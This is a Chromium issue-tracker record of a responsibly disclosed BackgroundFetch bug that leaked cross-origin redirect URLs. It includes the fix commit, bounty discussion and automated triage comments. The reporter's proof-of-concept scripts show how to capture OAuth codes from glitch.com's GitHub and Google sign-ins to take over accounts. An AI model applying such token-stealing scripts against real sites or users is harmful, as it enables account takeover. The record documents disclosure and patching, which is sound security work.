# Security: BackgroundFetch leaks URL of cross-origin redirects

| Field | Value |
|-------|-------|
| **Issue ID** | [40058171](https://issues.chromium.org/issues/40058171) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>BackgroundFetch |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | la...@gmail.com |
| **Assignee** | ra...@chromium.org |
| **Created** | 2021-12-09 |
| **Bounty** | $8,000.00 |

## Description

**VULNERABILITY DETAILS**  

BackgroundFetch leaks the URL of cross-origin redirects (similar bugs are <https://crbug.com/chromium/1152226> and <https://crbug.com/chromium/1039869>).

**VERSION**  

Version 96.0.4664.93 (Official Build) Arch Linux (64-bit)

**REPRODUCTION CASE**  

I made a sample page that simply redirects to the URL specified via the `url` parameter (make sure `https://foregoing-sulky-carpenter.glitch.me` is running before testing).

test.html

```
<script>  
  const url = "https://foregoing-sulky-carpenter.glitch.me/redirect?url=https://www.google.com";  
  
  navigator.serviceWorker.ready.then(async (swReg) => {  
    const bgFetch = await swReg.backgroundFetch.fetch("test", [new Request(url, { credentials: "include" })]);  
  
    const targetPage = await bgFetch.match(url);  
    const response = await targetPage.responseReady;  
  
    console.log(response.url);  // "https://www.google.com"  
  });  
  
  navigator.serviceWorker.register("sw.js");  
</script>  

```

sw.js

```
// can be empty  

```

Start a local http server: `python -m http.server`

**CREDIT INFORMATION**  

Reporter credit: Maurice Dauer

## Attachments

- deleted (application/octet-stream, 0 B)
- [issue.patch](attachments/issue.patch) (text/plain, 1001 B)
- [glitch_account_takeover.mp4](attachments/glitch_account_takeover.mp4) (video/mp4, 4.4 MB)

## Timeline

### [Deleted User] (2021-12-09)

[Empty comment from Monorail migration]

### do...@chromium.org (2021-12-09)

+Background Fetch folks, can you help triage this? Also +folks from the Blink security features team.

[Monorail components: Blink>BackgroundFetch]

### [Deleted User] (2021-12-09)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-10)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-12-23)

rayankans: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-03)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-13)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-24)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-07)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-03-17)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### la...@gmail.com (2022-03-22)

Is there any update on this?

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### la...@gmail.com (2022-04-21)

friendly ping

### [Deleted User] (2022-05-23)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### la...@gmail.com (2022-05-31)

friendly ping, given that this is probably high severity since it is not required to guess the url, see the comment of a similar issue at https://bugs.chromium.org/p/chromium/issues/detail?id=1248444#c2.

### la...@gmail.com (2022-06-02)

I made a quick patch that should fix the issue. It only exposes the initially requested URL in case of failing CORS checks.

### la...@gmail.com (2022-06-03)

better patch

### ra...@chromium.org (2022-06-07)

Thank you for looking into this!

There seems to be a broader issue with cross-origin redirects (https://bugs.chromium.org/p/chromium/issues/detail?id=1320432#c14), but I guess it wouldn't hurt to patch this for now.

### gi...@appspot.gserviceaccount.com (2022-06-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c643d18a078d21af52875981331100bfcc0004bb

commit c643d18a078d21af52875981331100bfcc0004bb
Author: Rayan Kanso <rayankans@google.com>
Date: Tue Jun 07 13:13:36 2022

[BackgroundFetch] Don't expose URL chain in case of CO redirect

Bug: 1278255
Change-Id: If853327b853e29792e5c8d1dfaeecf21d6fec004
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3693143
Reviewed-by: Susanne Westphal <swestphal@google.com>
Commit-Queue: Rayan Kanso <rayankans@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1011409}

[modify] https://crrev.com/c643d18a078d21af52875981331100bfcc0004bb/content/browser/background_fetch/storage/mark_request_complete_task.cc


### ra...@chromium.org (2022-06-08)

[Empty comment from Monorail migration]

### [Deleted User] (2022-06-08)

[Empty comment from Monorail migration]

### [Deleted User] (2022-06-08)

[Empty comment from Monorail migration]

### am...@google.com (2022-06-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-06-24)

Congratulations! The VRP Panel has decided to award you $5,000 for this report. Thank you for your efforts and nice work! 

### la...@gmail.com (2022-06-24)

Hey amyressler@, I appreciate the reward, but I'm wondering why the reward amount is the same as for example for https://crbug.com/chromium/1248444. That issue requires the attacker to guess the full URL correctly, whereas this issue leaks the full URL including the query string (which may contain sensitive tokens that are almost impossible to guess), making this issue significantly more severe IMO.
Additionally, https://crbug.com/chromium/1248444 can be mitigated by the X-Frame-Options response header. That isn't the case for this issue.

Thanks in advance!

### am...@chromium.org (2022-06-24)

Hello, we evaluate each report individually, not in reference to other/similar reports. The VRP Panel felt this was an appropriate amount given the impact shown, report quality, and analysis provided in the report. If you would like, we can re-evaluate it at a future VRP Panel session for a reassessment and potential change in reward amount. Please let me know if you would like that. You can also provide additional information in advance of that to help demonstrate your case. 

### la...@gmail.com (2022-06-24)

Thanks for the clarification and I would appreciate it if the VRP panel could re-evaluate the reward amount. I feel like I didn't show the full impact and will try to demonstrate it better in future reports. As I mentioned in https://crbug.com/chromium/1278255#c27, this issue can be used to leak sensible tokens, for example in Oauth login flows, which can then be used to ultimately take over an account.

Here is an example of taking over a https://glitch.com/ account when signing in via github:
- Register/Login at https://github.com/
- Register/Login via github at https://glitch.com/
- Visit a URL hosting the following files:
```test.html
<script>
  const url = "https://api.glitch.com/v1/auth/github?callbackURL=https://glitch.com/signin/github";

  navigator.serviceWorker.ready.then(async (swReg) => {
    const bgFetch = await swReg.backgroundFetch.fetch("test", [new Request(url, { credentials: "include" })]);

    const targetPage = await bgFetch.match(url);
    const response = await targetPage.responseReady;

    console.log(response.url);
  });

  navigator.serviceWorker.register("sw.js");
</script>
```

```sw.js
// can be empty
```
- You should then see a URL like this in the console: `https://glitch.com/signin/github?code=<token>`
- Open a new incognito browser instance and visit the URL with the token.

I have attached a video that demonstrates this.

### la...@gmail.com (2022-06-25)

The example in https://crbug.com/chromium/1278255#c29 can also be applied to when signing in via Google, only the `test.html` file needs to be changed:
```test.html
<script>
  const url = "https://api.glitch.com/v1/auth/google?callbackURL=https%3A%2F%2Fglitch.com%2Fsignin%2Fgoogle";

  navigator.serviceWorker.ready.then(async (swReg) => {
    const bgFetch = await swReg.backgroundFetch.fetch("test", [new Request(url, { credentials: "include" })]);

    const targetPage = await bgFetch.match(url);
    const response = await targetPage.responseReady;

    console.log(response.url);
  });

  navigator.serviceWorker.register("sw.js");
</script>
```

### am...@chromium.org (2022-07-01)

Hi Maurice, thank you for the new POCs and additional information. We have reassessed your report and have decided to increase the reward amount by $3000 for a total of an $8000 reward. Thanks again and nice work! 

### am...@google.com (2022-07-01)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-01)

[Empty comment from Monorail migration]

### am...@google.com (2022-08-02)

[Empty comment from Monorail migration]

### am...@google.com (2022-08-12)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-12)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1278255?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058171)*
